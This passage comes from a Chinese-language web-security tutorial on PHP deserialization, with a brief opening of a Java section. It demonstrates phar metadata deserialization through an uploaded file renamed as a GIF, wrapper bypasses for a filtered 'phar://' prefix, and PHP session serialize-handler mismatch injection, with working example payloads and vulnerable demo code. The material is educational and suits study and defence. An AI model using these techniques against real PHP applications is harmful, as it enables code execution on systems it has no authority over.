class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> AnyClass();</span><br><span class="line"><span class="variable">$o</span>-&gt;output = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="comment">//签名2将自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><p>访问，得到 hack.phar</p><p><img src="https://i.loli.net/2021/08/16/FAST5wPB3aQu2IE.png" alt="image-20210816152258664"></p><p>将 hack.phar 后缀修改为 hack.gif</p><p>在 upload_file.html 里上传</p><p><img src="https://i.loli.net/2021/08/16/8q7iuL96Xj4CeSg.png" alt="image-20210816152845318"></p><p><img src="https://i.loli.net/2021/08/16/YRJEP4uIzharXQM.png" alt="image-20210816152858027"></p><p>然后我们进入 file_un.php</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename=phar://hack.gif</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/16/pZsvBjrJdhXlWcM.png" alt="image-20210816153008894"></p><p>可以看到，命令成功执行</p><h2 id="3-5-绕过姿势：过滤-phar"><a href="#3-5-绕过姿势：过滤-phar" class="headerlink" title="3.5 绕过姿势：过滤 phar"></a>3.5 绕过姿势：过滤 phar</h2><ul><li>当题目环境限制 phar 不能出现在前面的字符里，即无法使用 <code>phar:// 协议</code>  ，可以使用 <code>compress.bzip2://</code>和<code>compress.zlib://</code>等绕过</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">compress.bzip://phar:///test.phar/test.txt</span><br><span class="line">compress.bzip2://phar:///test.phar/test.txt</span><br><span class="line">compress.zlib://phar:///home/sx/test.phar/test.txt</span><br><span class="line">php://filter/resource=phar:///test.phar/test.txt</span><br></pre></td></tr></table></figure><ul><li><p>当环境限制了phar不能出现在前面的字符里，还可以配合其他协议进行利用。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=phar://phar.phar</span><br></pre></td></tr></table></figure></li><li><p>GIF格式验证可以通过在文件头部添加GIF89a绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、<span class="variable">$phar</span>-&gt;setStub(“GIF89a”.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、生成一个phar.phar，修改后缀名为phar.gif</span><br></pre></td></tr></table></figure></li></ul><h2 id="3-6-php-session-反序列化"><a href="#3-6-php-session-反序列化" class="headerlink" title="3.6 php-session 反序列化"></a>3.6 php-session 反序列化</h2><p><a href="https://www.cnblogs.com/NPFS/p/13795170.html">https://www.cnblogs.com/NPFS/p/13795170.html</a></p><p><a href="https://www.freebuf.com/news/202819.html">https://www.freebuf.com/news/202819.html</a></p><p><a href="https://blog.spoock.com/2016/10/16/php-serialize-problem/?utm_source=tuicool&amp;utm_medium=referral">https://blog.spoock.com/2016/10/16/php-serialize-problem/?utm_source=tuicool&amp;utm_medium=referral</a></p><p><a href="https://github.com/80vul/phpcodz/blob/master/research/pch-013.md">https://github.com/80vul/phpcodz/blob/master/research/pch-013.md</a></p><h3 id="3-6-1-关于-php-中的-session-存储机制"><a href="#3-6-1-关于-php-中的-session-存储机制" class="headerlink" title="3.6.1 关于 php 中的 session 存储机制"></a>3.6.1 关于 php 中的 session 存储机制</h3><p><strong>session 介绍：</strong></p><blockquote><p>在计算机中，尤其是在网络应用中，称为“<strong>会话控制</strong>”。Session 对象存储特定用户会话所需的属性及配置信息。这样，当用户在应用程序的 Web 页之间跳转时，存储在 Session 对象中的变量将不会丢失，而是在整个用户会话中一直存在下去。当用户请求来自应用程序的 Web 页时，如果该用户还没有会话，则 Web 服务器将自动创建一个 Session 对象。当会话过期或被放弃后，服务器将终止该会话。</p><p>当第一次访问网站时，Seesion_start()函数就会创建一个唯一的Session ID，并自动通过HTTP的响应头，<strong>将这个Session ID保存到客户端Cookie中。同时，也在服务器端创建一个以Session ID命名的文件，用于保存这个用户的会话信息。</strong>当同一个用户再次访问这个网站时，也会自动通过HTTP的请求头将Cookie中保存的Seesion ID再携带过来，这时Session_start()函数就不会再去分配一个新的Session ID，而是在服务器的硬盘中去寻找和这个Session ID同名的Session文件，将这之前为这个用户保存的会话信息读出，在当前脚本中应用，达到跟踪这个用户的目的。</p></blockquote><p><strong>php 中的 session 存储相关匹配值：</strong></p><p>PHP 版本 &gt;= 5.4 中有关 session 的相关配置：php.ini</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">1. session.upload_progress.enabled = on</span><br><span class="line"><span class="comment"># enabled = on 表示 upload_progress 功能开启，即当浏览器向服务器上传一个文件时，php 会把此次文件上传的详细信息，如上传时间、上传进度等都储存在 session中</span></span><br><span class="line"></span><br><span class="line">2. session.upload_progress.cleanup = on</span><br><span class="line"><span class="comment"># cleanup = on 当文件上传结束之后， oho 会立即将对应的 session 文件清空</span></span><br><span class="line"></span><br><span class="line">3. session.upload_progress.prefix = <span class="string">&quot;upload_progress_&quot;</span></span><br><span class="line">4. session.upload_progress.name = <span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span></span><br><span class="line"><span class="comment"># name当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控；</span></span><br><span class="line"><span class="comment"># 重点：prefix+name将表示为session中的键名</span></span><br><span class="line"></span><br><span class="line">5. session.upload_progress.freq = <span class="string">&quot;1%&quot;</span></span><br><span class="line">6. session.upload_progress.min_freq = <span class="string">&quot;1&quot;</span></span><br><span class="line">7. session.use_strict_mode=off </span><br><span class="line"><span class="comment"># 表示我们对 Cookie 中的 session 是可控的</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1. session.save_path=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment"># 设置 session 的储存路径</span></span><br><span class="line"></span><br><span class="line">2. session.save_handler=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment"># 设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)</span></span><br><span class="line"></span><br><span class="line">3. session.auto_start</span><br><span class="line"><span class="comment"># boolen --指定会话模块是否在请求开始时启动一个会话,默认为0不启动</span></span><br><span class="line"></span><br><span class="line">4. session.serialize_handler</span><br><span class="line"><span class="comment"># string --定义用来序列化/反序列化的处理器名字。默认使用php</span></span><br></pre></td></tr></table></figure><p>php 版本为 5.4.45 的部分默认配置如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">;session.save_path = <span class="string">&quot;/tmp&quot;</span></span><br><span class="line">session.save_handler = files</span><br><span class="line">session.auto_start = 0</span><br><span class="line">session.serialize_handler = php</span><br></pre></td></tr></table></figure><p><code>session.serialize_handler = php</code> 该选项是用来设置 session 的 <code>序列化引擎</code> 的，除了默认的 php 引擎之外，也存在其他的，不同的 引擎对应的 session 的存储方式不同。</p><p><strong>其它存储引擎如下</strong>：</p><ul><li><strong>php_binary</strong>:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值</li><li><strong>php</strong>:存储方式是，键名+竖线+经过serialize()函数序列处理的值</li><li><strong>php_serialize(php&gt;5.5.4)</strong>:存储方式是，经过serialize()函数序列化处理的值</li></ul><p>如果需要修改该引擎，须有手动添加代码 <code>ini_set(&#39;session.serialize_handler&#39;, &#39;需要设置的引擎&#39;);</code>，例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"> session_start();</span><br></pre></td></tr></table></figure><p>下面我们仅仅讨论 php 引擎所引起的 反序列化。</p><p><strong>php 中的 session 存储机制：</strong></p><p>php 中的 session 中的内容不是存在内存当中的，而是以文件的形式进行存储，存储方式是由配置项 <code>session.save_handler</code> 来进行确定的，默认以文件的方式存储。所存储的文件名是以 <code>sess_sessionid</code> 来进行命名的，文件的内容就是 session 值得序列化之后的内容。</p><p><img src="https://i.loli.net/2021/09/12/VwE3NXjsbhq5KoJ.png" alt="image-20210912093352903"></p><p>例如：客户端的用户进行抓包，在 <code>Cookie</code> 字段中进行设置 <code>PHPSESSION=test</code> ，则 服务器上就将会创建一个文件 <code>/tmp/sess_test</code> 文件，用于存储 用户的 SESSIONS 信息。</p><p>测试：PHP 7.3.4             </p><p><strong>php 默认引擎下：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    session_start();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;test&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/09/12/TNsWVOG8L9oZwQ3.png" alt="image-20210912100023408"></p><p>session 文件中其中，<code>name</code> 是键名，<code>s:4:&quot;test&quot;;</code> 是 <code>serialize(&quot;test&quot;)</code> 的结果。</p><p><strong>php_serialize 引擎下：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"> session_start();</span><br><span class="line"> <span class="variable">$SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;test&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/09/12/ARNKoeV6fZXclxU.png" alt="image-20210912100614688"></p><p>session 文件内容是 a:1:{s:4:”name”;s:4:”test”;}，其中 </p><p><code>a:1</code> 只要是使用 php_serialize 引擎都会加上的，然后使用 php_serialize 引擎将会把 session 中的键名和键值都进行反序列化。</p><p><strong>在php_binary引擎下：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_binary&#x27;</span>);</span><br><span class="line"> session_start();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;test&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/09/12/CVnR1U5O6mioqtc.png" alt="image-20210912101016728"></p><p>session 文件内容是 names:4:”test”;</p><p>由于<code>name</code>的长度是4，4在ASCII表中对应的就是<code>EOT</code>。根据php_binary的存储规则，最后就是<code>names:6:&quot;spoock&quot;;</code>。(突然发现ASCII的值为4的字符无法在网页上面显示，这个大家自行去查ASCII表吧)</p><h3 id="3-6-2-php-session-序列化简单测试：利用原理"><a href="#3-6-2-php-session-序列化简单测试：利用原理" class="headerlink" title="3.6.2 php-session 序列化简单测试：利用原理"></a>3.6.2 php-session 序列化简单测试：利用原理</h3><p><strong>序列化简单测试：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">lover</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;func = <span class="string">&#x27;phpinfo()&#x27;</span>;    </span><br><span class="line">        &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;func);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们可以传入：<code>?a=O:5:&quot;lover&quot;:1:&#123;s:4:&quot;func&quot;;s:14:&quot;echo%20&quot;spoock&quot;;&quot;;&#125;</code></p><p>则将会在页面中输出 <code>spoock</code> 。</p><p><strong>php session 反序列化构造：</strong></p><p>PHP中的Session的实现是没有的问题，危害主要是由于程序员的Session使用不当而引起的。<br><strong>如果在PHP在反序列化存储的$_SESSION数据时使用的引擎和序列化使用的引擎不一样，会导致数据无法正确的进行反序列化。</strong>通过精心构造的数据包，就可以绕过程序的验证或者是执行一些系统的方法。</p><p>示例：</p><p>假如 题目本身是 php_serialize 的存储引擎，如果我们注入数据：<code>a=|o:4:&quot;test&quot;:0:&#123;&#125;</code></p><p>则 其通过 php_serialize 的引擎处理过后，将会变成 <code>a:1:&#123;s:1:&quot;a&quot;;a:16:&quot;|o:4:&quot;test&quot;:0:&#123;&#125;&quot;&#125;</code></p><p>随后 如果我们利用 php 的存储引擎来读取，那么经过解读之后将会理解为 ： <code>&#123;s:1:&quot;a&quot;;a:16:&quot;</code>  是键名，而 | 后面的就会被理解为一个对象的实例化注入。</p><p><strong>测试 ：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php&#x27;);</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;a&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line">var_dump(<span class="variable">$_SESSION</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br></pre></td></tr></table></figure><p>访问 ?a=|o:4:”test”:0:{}</p><p>此时 session 文件内容为 a:1:{s:1:”a”;a:16:”|o:4:”test”:0:{}”}</p><p>设置 <code>ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);</code> ，即使用 php 引擎读取，再次访问即可。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">array(1) &#123;</span><br><span class="line">  [<span class="string">&quot;a:1:&#123;s:1:&quot;</span>a<span class="string">&quot;;a:16:&quot;</span><span class="string">&quot;]=&gt;</span></span><br><span class="line"><span class="string">  object(stdClass)#1 (0) &#123;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="3-6-3-php-session-序列化实际利用"><a href="#3-6-3-php-session-序列化实际利用" class="headerlink" title="3.6.3 php-session 序列化实际利用"></a>3.6.3 php-session 序列化实际利用</h3><p><strong>必备知识：</strong></p><ul><li><ul><li><p>选项 <code>session.auto_start=On</code>  ，PHP在接收请求时会自动初始化 Session，不需要执行 session_start()。默认情况下，该选项 <code>关闭</code> 。</p></li><li><p>选项 <code>session.use_strict_mode=0</code> ，默认值是0即未启动时，用户可以自定义 session。</p><p>方法：用户自己抓包，在 Cookie 里面设置，PHPSESSION=flag，那么PHP将会在服务器上也创建一个文件 <code>/tmp/sess_flag</code>  。这时用户并没有初始化 session ，php也照样自动初始化 session，而产生了一个键值，该键值由 <code>ini.get(&quot;session.upload_progress.prefix&quot;)+我们构造的session.upload_progress.name</code> 一起组成，最终写入 <code>sess_文件</code> li里。</p><p>linux 下，session文件一般的默认存储位置是 <code>/tmp 或 /var/lib/php/session</code></p></li></ul></li><li><p>避免 <code>session.upload_progress.cleanup=on</code> 的干扰</p><p>该选项导致文件成功上传之后，一旦读取 POST 信息之后，会清除进度信息，session 文件将会被立即清理。重点是 该选项默认开启。</p><ul><li>方法：<strong>条件竞争</strong></li></ul></li></ul><p><strong>当 session.auto_start＝On 时：</strong></p><p>如果 session.auto_start＝On ，就会自动注册 session 会话，因为该过程是发生在脚本代码执行前，所以在脚本中设定的包括序列化处理器在内的 session 相关配选项的设置是不起作用的，因此我们需要 <strong>在脚本中设置 序列化处理器配置的程序会在 session.auto_start＝On 时，销毁自动生成的 Session 会话</strong>，然后再设置需要的序列化处理器，那么第一次我们所使用的就是我们自己设置的存储器，而第二次执行时，系统仍会自动调用 session_start() 函数注册会话，这时所使用的就是默认的存储引擎了。</p><p>所以，如果脚本中设置的序列化处理器与 php.ini 中设置的不同，就会出现安全问题，如下面的代码：</p><p>已知：默认的存储引擎是 php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (ini_get(<span class="string">&#x27;session.auto_start&#x27;</span>)) &#123;</span><br><span class="line">    session_destroy();</span><br><span class="line">&#125;</span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;a&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br></pre></td></tr></table></figure><p>第一次访问脚本 ，传入参数 <code>?a=|O:8:&quot;stdClass&quot;:0:&#123;&#125;</code>，脚本将会按照 php_serialize 处理数据，得到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:1:&#123;s:1:&quot;a&quot;;s:20:&quot;|O:8:&quot;stdClass&quot;:0:&#123;&#125;&quot;;&#125;</span><br></pre></td></tr></table></figure><p>第二次访问，PHP 会按照 php.ini 里设置的序列化处理器反序列化存储的数据，这时如果 php.ini 里设置的是 php 处理器的话，将会反序列化伪造的数据，成功实例化了 stdClass 对象：）。</p><p><strong>当 session.auto_start＝Off 时：</strong></p><p>两个脚本注册 Session 会话时使用的序列化处理器不同，就会出现安全问题，如下面的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//foo1.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;a&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//foo2.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"><span class="comment">//or session.serialize_handler set to php in php.ini </span></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span> </span>&#123;</span><br><span class="line"><span class="keyword">var</span> <span class="variable">$hi</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;hi&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;hi;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>访问 foo1.php 提交数据 ?a=|O:1:”a”:1:{s:2:”hi”;s:7:”success”;}</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:1:&#123;s:1:&quot;a&quot;;s:36:&quot;|O:1:&quot;a&quot;:1:&#123;s:2:&quot;hi&quot;;s:7:&quot;success&quot;;&#125;&quot;;&#125;</span><br></pre></td></tr></table></figure><p>再访问 foo2.php ，成功</p><p><img src="https://i.loli.net/2021/09/12/9BrpshRMXJCjGUz.png" alt="image-20210912112309204"></p><p>由于 访问 foo1 时，传入的数据将会使用 php_serialize 进行序列化，然后再访问 foo2 时，程序将会使用 php 引擎来反序列化 session 中是之举，从而实例化 a 对象，而执行其中的魔术方法。</p><p><strong>补充：</strong></p><p>为什么在 解析 session 文件时为什么在解析session文件时直接对’|’后的值进行反序列化处理，这也是处理器的功能？这个其实是因为session_start()这个函数，可以看下官方说明：</p><blockquote><p>当会话自动开始或者通过 session_start() 手动开始的时候， PHP 内部会调用会话管理器的 open 和 read 回调函数。 会话管理器可能是 PHP 默认的， 也可能是扩展提供的（SQLite 或者 Memcached 扩展）， 也可能是通过 session_set_save_handler() 设定的用户自定义会话管理器。 通过 read 回调函数返回的现有会话数据（使用特殊的序列化格式存储），PHP 会自动反序列化数据并且填充 $_SESSION 超级全局变量</p></blockquote><h3 id="3-6-4-CTF-题目"><a href="#3-6-4-CTF-题目" class="headerlink" title="3.6.4 CTF 题目"></a>3.6.4 CTF 题目</h3><h1 id="速查"><a href="#速查" class="headerlink" title="速查"></a>速查</h1><ul><li><p>序列化后的结果是一串字符串。</p></li><li><p>反序列化会解开序列化的字符串生成相应类型的数据。</p></li></ul><p>如下代码示例，img是一个数组，下标分别是one和two，对应的值分别是flag,test。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$img[&#x27;one&#x27;] = &quot;flag&quot;;</span><br><span class="line">$img[&#x27;two&#x27;] = &quot;test&quot;;</span><br><span class="line">$a = serialize($img);</span><br><span class="line">var_dump($a);</span><br><span class="line">#输出: string(48) &quot;a:2:&#123;s:3:&quot;one&quot;;s:4:&quot;flag&quot;;s:3:&quot;two&quot;;s:4:&quot;test&quot;;&#125;&quot;</span><br><span class="line"></span><br><span class="line">$b = unserialize($a);</span><br><span class="line">var_dump($b);</span><br><span class="line">/*输出如下内容:</span><br><span class="line">array(2) &#123;</span><br><span class="line">  [&quot;one&quot;]=&gt;</span><br><span class="line">  string(4) &quot;flag&quot;</span><br><span class="line">  [&quot;two&quot;]=&gt;</span><br><span class="line">  string(4) &quot;test&quot;</span><br><span class="line">&#125;</span><br><span class="line">*/</span><br></pre></td></tr></table></figure><p><strong>序列化部分</strong>:</p><p>经过serialize序列化后生成了相应的字符串: a:2:{s:3:”one”;s:4:”flag”;s:3:”two”;s:4:”test”;}</p><p>a表示数组 , a:2中的2表示有两个键值，即对应的one、two两组键值对。</p><p>花括号中的s都表示string即字符串，</p><p>s:后面的值分别是3、4、3、4,即对应的字符串长度，比如one长度是三，flag长度是4</p><p><strong>反序列化部分:</strong></p><p>unserialize函数将字符串解序列化，我们用var_dump函数显示了他的详细信息。</p><p>可见解序列化后由变量$b，接收了img数组。</p><h3 id="序列化中每个字母的表示"><a href="#序列化中每个字母的表示" class="headerlink" title="序列化中每个字母的表示"></a>序列化中每个字母的表示</h3><table><thead><tr><th align="left">a</th><th align="left">array数组</th></tr></thead><tbody><tr><td align="left">b</td><td align="left">boolean判断类型</td></tr><tr><td align="left">d</td><td align="left">double浮点数</td></tr><tr><td align="left">i</td><td align="left">integer整数型</td></tr><tr><td align="left">o</td><td align="left">common object 一般的对象</td></tr><tr><td align="left">r</td><td align="left">reference引用类型</td></tr><tr><td align="left">s</td><td align="left">string字符串类型</td></tr><tr><td align="left">C</td><td align="left">custom object</td></tr><tr><td align="left">O</td><td align="left">class</td></tr><tr><td align="left">N</td><td align="left">null</td></tr><tr><td align="left">R</td><td align="left">pointer reference</td></tr><tr><td align="left">U</td><td align="left">unicode string</td></tr></tbody></table><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__wakeup() //使用unserialize时触发 </span><br><span class="line">__sleep() //使用serialize时触发 </span><br><span class="line">__destruct() //对象被销毁时触发</span><br><span class="line">__call()    //在对象上下文中调用不可访问的方法时触发——对象调用一个没有声明的方法时，触发 </span><br><span class="line">__callStatic() //在静态上下文中调用不可访问的方法时触发 </span><br><span class="line">__get() //用于从不可访问的属性读取数据 </span><br><span class="line">__set() //用于将数据写入不可访问的属性 </span><br><span class="line">__isset() //在不可访问的属性上调用isset()或empty()触发 </span><br><span class="line">__unset() //在不可访问的属性上使用<span class="built_in">unset</span>()时触发</span><br><span class="line">__toString() //把类当作字符串使用时触发 <span class="built_in">echo</span> 对象; <span class="variable">$text</span>=<span class="variable">$test</span>+$对象； </span><br><span class="line">__invoke() //当尝试以调用函数的方式调用一个对象时，该方法会被自动调用</span><br></pre></td></tr></table></figure><h2 id="1-3-危害"><a href="#1-3-危害" class="headerlink" title="1.3 危害"></a>1.3 危害</h2><p>SQL注入</p><p>代码执行</p><p>目录遍历</p><h1 id="四、JAVA-反序列化"><a href="#四、JAVA-反序列化" class="headerlink" title="四、JAVA 反序列化"></a>四、JAVA 反序列化</h1><p>序列化：将对象的状态信息转换为可以存储或者传输的形式的过程。序列化期间，对象将其当前的状态写入到临时或持久型储存区。</p><p>反序列化：从储存区读取到数据，将其还原为对象</p><p><strong>好处：</strong></p><ul><li>把对象的字节序列永久地保存到硬盘上，实现对象的持久化，通常存放在一个文件中；</li><li>利用序列化实现远程通信，即在网络上传递对象的字节序列。</li></ul><p><strong>实例理解</strong></p><blockquote><p>Web 服务器中的 Session 会话对象，当有10万用户并发访问，就有可能出现10万个 Session 对象，显然这种情况内存可能是吃不消的。</p><p>于是 Web 容器就会把一些 Session 先序列化，让他们离开内存空间，序列化到硬盘中，当需要调用时，再把保存在硬盘中的对象还原到内存中。</p><hr><p>我们知道，当两个进程进行远程通信时，彼此可以发送各种类型的数据，包括文本、图片、音频、视频等， 而这些数据都会以二进制序列的形式在网络上传送。</p><p>同样的序列化与反序列化则实现了 <strong>进程通信间的对象传送</strong>，发送方需要把这个Java对象转换为字节序列，才能在网络上传送；接收方则需要把字节序列再恢复为Java对象。</p></blockquote><p><strong>JDK 类库中序列化 API</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span 